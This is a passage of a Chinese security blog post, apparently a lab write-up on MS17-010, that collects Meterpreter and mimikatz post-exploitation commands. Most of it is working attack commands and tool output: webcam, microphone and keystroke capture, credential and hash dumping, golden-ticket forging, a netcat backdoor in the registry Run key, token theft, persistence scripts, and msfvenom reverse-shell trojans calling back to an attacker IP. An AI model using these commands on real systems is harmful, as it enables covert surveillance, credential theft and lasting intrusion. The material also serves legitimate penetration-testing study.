+<h5 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui -h查看帮助</span><br><span class="line">run getgui -e 开启远程桌面</span><br><span class="line">run getgui -u test -p !QAZ2wsx#EDC #添加用户</span><br><span class="line">run getgui -f 6662 -e #端口转发</span><br></pre></td></tr></table></figure>
+
+<h3 id="截图-amp-amp-截屏"><a href="#截图-amp-amp-截屏" class="headerlink" title="截图 &amp;&amp; 截屏"></a>截图 &amp;&amp; 截屏</h3><ul>
+<li><code>screenshot</code></li>
+<li><code>load espia #加载插件 screengrab #截图</code></li>
+<li><code>run vnc</code> # 使用vnc远程桌面连接偷窥</li>
+<li><code>enumdesktops</code> #查看可用的桌面</li>
+<li><code>getdesktop</code> #获取与当前会话关联的桌面</li>
+<li><code>set_desktop</code> #设置与当前会话关联的桌面</li>
+</ul>
+<h3 id="开启摄像头"><a href="#开启摄像头" class="headerlink" title="开启摄像头"></a>开启摄像头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webcam_list #列出目标机器的摄像头列表</span><br><span class="line">webcam_snap #打开目标机器摄像头拍摄一张照片</span><br><span class="line">webcam_stream #打开目标机器摄像头并开启直播</span><br><span class="line">record_mic #音频录制</span><br></pre></td></tr></table></figure>
+
+<h3 id="键盘记录keyscan"><a href="#键盘记录keyscan" class="headerlink" title="键盘记录keyscan"></a>键盘记录keyscan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start #开启记录</span><br><span class="line">keyscan_dump #输出截获到的输入记录</span><br><span class="line">keyscan_stop #停止键盘记录</span><br></pre></td></tr></table></figure>
+<p>这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。<br />会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。<br />可以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;capture&#x2F;keylog_recorder</span><br></pre></td></tr></table></figure>
+<p>这也时获取键盘记录的命令，与<code>keyscan</code>不同的是，这个命令记录之后会同时保存到攻击者主机<code>.msf4/loot/</code>目录下</p>
+<h3 id="mimikatz-kiwi获取密码"><a href="#mimikatz-kiwi获取密码" class="headerlink" title="mimikatz/kiwi获取密码"></a>mimikatz/kiwi获取密码</h3><blockquote>
+<p>Windows10 和 Windows 2019更新了SAM的格式，所以一些旧工具是无法DUMP出这两个系统的HASH值。建议用mimikatz。</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">Mimikatz使用大全</a><br><a href="https://www.cnblogs.com/pursuitofacm/p/6704219.html" target="_blank" rel="noopener">神器mimikatz使用命令方法总结</a><br><a href="https://www.secpulse.com/archives/65256.html" target="_blank" rel="noopener">几种windows本地hash值获取和破解详解</a><br><a href="https://www.sqlsec.com/2019/11/winhash.html" target="_blank" rel="noopener">Windows用户密码的加密方法与破解</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz #加载模块</span><br><span class="line">wdigest #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords #同样也是获取密码</span><br></pre></td></tr></table></figure>
+
+<p>mimikatz也有exe版本的，<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">下载地址</a></p>
+<p>控制台获取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug # 权限提升</span><br><span class="line">lsadump::lsa &#x2F;patch # 获取hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接cmd运行</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa &#x2F;patch&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>新版是kiwi了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi #加载模块</span><br><span class="line"></span><br><span class="line">creds_all              Retrieve all credentials (parsed) #直接用就能从内存中抓取明文密码。</span><br><span class="line">creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">creds_msv              Retrieve LM&#x2F;NTLM creds (parsed)</span><br><span class="line">creds_ssp              Retrieve SSP creds</span><br><span class="line">creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">dcsync                 Retrieve user account information via DCSync (unparsed)</span><br><span class="line">dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync</span><br><span class="line">golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">kiwi_cmd               Execute an arbitary mimikatz command (unparsed)</span><br><span class="line">lsa_dump_sam           Dump LSA SAM (unparsed)</span><br><span class="line">lsa_dump_secrets       Dump LSA secrets (unparsed)</span><br><span class="line">password_change        Change the password&#x2F;hash of a user</span><br><span class="line">wifi_list              List wifi profiles&#x2F;creds for the current user</span><br><span class="line">wifi_list_shared       List shared wifi profiles&#x2F;creds (requires SYSTEM)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden-Ticket"></a>Golden-Ticket</h3><h4 id="minikatz"><a href="#minikatz" class="headerlink" title="minikatz"></a>minikatz</h4><p>在mimikatz的控制台输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug # 获取权限</span><br><span class="line"></span><br><span class="line">lsadump::lsa &#x2F;inject &#x2F;name:krbtgt # 获取信息（关注 SID，NTLM。后面会用到</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:domain.local &#x2F;sid:krbtgt的sid &#x2F;krbtgt:krbtgt的NTLM &#x2F;id:Administrator的RID </span><br><span class="line"></span><br><span class="line">misc::cmd # 打开一个cmd</span><br><span class="line"></span><br><span class="line">之后就可以在那里访问域中的其他机器了</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="sniffer抓包"><a href="#sniffer抓包" class="headerlink" title="sniffer抓包"></a>sniffer抓包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 &#x2F;tmp&#x2F;lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
+
+<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><h4 id="incognito假冒令牌"><a href="#incognito假冒令牌" class="headerlink" title="incognito假冒令牌"></a>incognito假冒令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
+
+<h4 id="steal-token-窃取令牌"><a href="#steal-token-窃取令牌" class="headerlink" title="steal_token 窃取令牌"></a>steal_token 窃取令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>
+
+<h3 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h3><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><p><code>persistence</code>是生成一个vbs脚本，并写入到注册表里。<br>帮助目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -A        Automatically start a matching exploit&#x2F;multi&#x2F;handler to connect to the agent 自动启动一个匹配</span><br><span class="line">    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used. </span><br><span class="line">    -P &lt;opt&gt;  Payload to use, default is windows&#x2F;meterpreter&#x2F;reverse_tcp. 设置payload</span><br><span class="line">    -S        Automatically start the agent on boot as a service (with SYSTEM privileges) 系统启动时加载</span><br><span class="line">    -T &lt;opt&gt;  Alternate executable template to use</span><br><span class="line">    -U        Automatically start the agent when the User logs on 用户登录时启动</span><br><span class="line">    -X        Automatically start the agent when the system boots 系统开机时启动</span><br><span class="line">    -h        This help menu</span><br><span class="line">    -i &lt;opt&gt;  The interval in seconds between each connection attempt 反向连接的时间间隔</span><br><span class="line">    -p &lt;opt&gt;  The port on which the system running Metasploit is listening 攻击机监听的端口</span><br><span class="line">    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back 攻击者的IP</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -A -X -S -U -i 2 -p 6660 -r 192.168.2.2 -P windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;persistence_exe.</span><br><span class="line">[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe OPTION&#x3D;value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at &#x2F;root&#x2F;.msf4&#x2F;logs&#x2F;persistence&#x2F;WIN-L7LB8P6KDBM_20191210.2300&#x2F;WIN-L7LB8P6KDBM_20191210.2300.rc</span><br><span class="line">[*] Creating Payload&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.83 LPORT&#x3D;6660</span><br><span class="line">[*] Persistent agent script is 99613 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\gqePMVuqNBvev.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\gqePMVuqNBvev.vbs</span><br><span class="line">[+] Agent executed with PID 5012</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IwoxhlDkIPJSZa</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IwoxhlDkIPJSZa</span><br></pre></td></tr></table></figure>
+
+<p>根据输出信息，可以在靶机中找到相对应的注册表<br><img src="https://images.atsud0.me/images/post/Screenshot_20191211_105220_persistence_regedit.png" alt="regedit"></p>
+<h5 id="连接persistence后门"><a href="#连接persistence后门" class="headerlink" title="连接persistence后门"></a>连接persistence后门</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.83</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 6660</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_103433_persistence.png" alt="persistence"></p>
+<h4 id="metsvc后门"><a href="#metsvc后门" class="headerlink" title="metsvc后门"></a>metsvc后门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search metsvc</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;persistence_service</span><br></pre></td></tr></table></figure>
+
+<h5 id="连接metsvc后门"><a href="#连接metsvc后门" class="headerlink" title="连接metsvc后门"></a>连接metsvc后门</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;metsvc_bind_tcp </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 192.168.1.84</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 31337</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_110850_metsvc_bind_tcp.png" alt="con_metsvc"></p>
+<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>生成windows下的反弹木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.83 lport&#x3D;1111 -f exe -o a.exe</span><br><span class="line">#上传到靶机并执行</span><br><span class="line">meterpreter &gt; upload .&#x2F;a.exe</span><br><span class="line">[*] uploading  : .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">[*] uploaded   : .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">meterpreter &gt; execute -f a.exe</span><br><span class="line">Process 1892 created.</span><br></pre></td></tr></table></figure>
+
+<h5 id="连接后门"><a href="#连接后门" class="headerlink" title="连接后门"></a>连接后门</h5><p>在<code>msfconsole</code>中，使用<code>exploit/multi/handler</code>，设置的<code>payload</code>要与生成的木马的<code>payload</code>设置一样.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.83</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 1111</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_133343_.png" alt="msfvenom"></p>
+<p>注意：当退出此会话时，木马的进程同时也会关闭.</p>
+<h4 id="MSF取得的会话派生到CS"><a href="#MSF取得的会话派生到CS" class="headerlink" title="MSF取得的会话派生到CS"></a>MSF取得的会话派生到CS</h4><ol>
+<li>先在CS中新建一个http的监听</li>
+<li>在msf中使用这个模块:exploit/windows/local/payload_inject</li>
+<li>设置payload为http的监听: windows/meterpreter/reverse_http</li>
+<li>关闭DisablePayloadHandler:<code>set DisablePayloadHandler true</code></li>
+<li>设置会话和本地监听后运行即可</li>
+<li>回到cs中可以看到已经获得shell了</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://www.secpulse.com/archives/51077.html" target="_blank" rel="noopener">msf派生shell给cs</a></li>
+<li><a href="http://drops.xmd5.com/static/drops/tips-2227.html" target="_blank" rel="noopener">metasploit渗透测试笔记</a></li>
+<li><a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></li>
+<li><a href="https://blog.csdn.net/qq_41880069/article/details/82908293#4_114" target="_blank" rel="noopener">meterpreter后渗透攻击总结</a></li>
+<li><a href="https://paper.seebug.org/29/#meterpreter" target="_blank" rel="noopener">Ppaer渗透工具篇</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/14/MS17-010%E5%A4%8D%E7%8E%B0-%E9%83%A8%E5%88%86%E5%90%8E%E6%B8%97%E9%80%8F%E6%8C%87%E4%BB%A4/" title="MS17-010复现-部分后渗透指令">http://atsud0.me/2020/04/14/MS17-010复现-部分后渗透指令/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+              <a href="/tags/Metasploit/" rel="tag"><i class="fa fa-tag"></i> Metasploit</a>
+              <a href="/tags/MS17-010/" rel="tag"><i class="fa fa-tag"></i> MS17_010</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/14/Tmux%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8C%97/" rel="prev" title="Tmux快速指北">
+      <i class="fa fa-chevron-left"></i> Tmux快速指北
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/14/TryHackMe-Kenobi/" rel="next" title="TryHackMe-Kenobi">
+      TryHackMe-Kenobi <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#情报收集"><span class="nav-number">1.</span> <span class="nav-text">情报收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.1.</span> <span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#arp-scan"><span class="nav-number">1.1.1.</span> <span class="nav-text">arp-scan</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测主机服务"><span class="nav-number">1.2.</span> <span class="nav-text">探测主机服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#拿到cmd-shell后乱码"><span class="nav-number">2.1.</span> <span class="nav-text">拿到cmd shell后乱码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后渗透"><span class="nav-number">3.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程转移"><span class="nav-number">3.1.</span> <span class="nav-text">进程转移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统命令"><span class="nav-number">3.2.</span> <span class="nav-text">系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">3.3.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行文件"><span class="nav-number">3.4.</span> <span class="nav-text">执行文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#清除日志"><span class="nav-number">3.5.</span> <span class="nav-text">清除日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timestomp-伪造时间"><span class="nav-number">3.6.</span> <span class="nav-text">timestomp 伪造时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本网络命令"><span class="nav-number">3.7.</span> <span class="nav-text">基本网络命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#添加代理"><span class="nav-number">3.7.1.</span> <span class="nav-text">添加代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口转发"><span class="nav-number">3.7.2.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#autoroute添加路由"><span class="nav-number">3.7.3.</span> <span class="nav-text">autoroute添加路由</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">3.8.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#local-exploit-suggester"><span class="nav-number">3.9.</span> <span class="nav-text">local_exploit_suggester</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getsystem"><span class="nav-number">3.9.1.</span> <span class="nav-text">getsystem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypassuac"><span class="nav-number">3.9.2.</span> <span class="nav-text">bypassuac</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内核漏洞提权"><span class="nav-number">3.9.3.</span> <span class="nav-text">内核漏洞提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">3.10.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#scraper"><span class="nav-number">3.10.1.</span> <span class="nav-text">scraper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看目标主机是否是虚拟机"><span class="nav-number">3.10.2.</span> <span class="nav-text">查看目标主机是否是虚拟机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关闭杀软"><span class="nav-number">3.10.3.</span> <span class="nav-text">关闭杀软</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关闭防火墙-Cmd命令"><span class="nav-number">3.10.4.</span> <span class="nav-text">关闭防火墙(Cmd命令)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开启3389"><span class="nav-number">3.10.5.</span> <span class="nav-text">开启3389</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#enable-rdp"><span class="nav-number">3.10.5.1.</span> <span class="nav-text">enable_rdp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getgui"><span class="nav-number">3.10.5.2.</span> <span class="nav-text">getgui</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截图-amp-amp-截屏"><span class="nav-number">3.11.</span> <span class="nav-text">截图 &amp;&amp; 截屏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启摄像头"><span class="nav-number">3.12.</span> <span class="nav-text">开启摄像头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#键盘记录keyscan"><span class="nav-number">3.13.</span> <span class="nav-text">键盘记录keyscan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz-kiwi获取密码"><span class="nav-number">3.14.</span> <span class="nav-text">mimikatz&#x2F;kiwi获取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Golden-Ticket"><span class="nav-number">3.15.</span> <span class="nav-text">Golden-Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#minikatz"><span class="nav-number">3.15.1.</span> <span class="nav-text">minikatz</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sniffer抓包"><span class="nav-number">3.16.</span> <span class="nav-text">sniffer抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表操作"><span class="nav-number">3.17.</span> <span class="nav-text">注册表操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#令牌操纵"><span class="nav-number">3.18.</span> <span class="nav-text">令牌操纵</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#incognito假冒令牌"><span class="nav-number">3.18.1.</span> <span class="nav-text">incognito假冒令牌</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#steal-token-窃取令牌"><span class="nav-number">3.18.2.</span> <span class="nav-text">steal_token 窃取令牌</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后门植入"><span class="nav-number">3.19.</span> <span class="nav-text">后门植入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#persistence"><span class="nav-number">3.19.1.</span> <span class="nav-text">persistence</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#连接persistence后门"><span class="nav-number">3.19.1.1.</span> <span class="nav-text">连接persistence后门</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#metsvc后门"><span class="nav-number">3.19.2.</span> <span 